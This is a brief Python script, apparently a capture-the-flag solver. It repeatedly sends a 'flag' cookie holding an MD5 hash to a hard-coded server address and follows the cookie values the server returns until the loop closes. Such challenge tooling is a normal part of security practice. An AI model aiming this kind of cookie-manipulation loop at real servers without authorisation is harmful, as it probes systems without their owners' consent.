import requests

url = "http://159.89.166.12:13500/"
MD5 = 'bc54f4d60f1cec0f9a6cb70e13f2127a'
print(MD5)
while True:
    cookie = {'flag': MD5}
    res = requests.get(url, cookies=cookie)
    reponse_cookie = str(res.cookies).split(' ')[1][5:]
    if reponse_cookie == 'bc54f4d60f1cec0f9a6cb70e13f2127a':
        break
    MD5 = reponse_cookie
    print(reponse_cookie)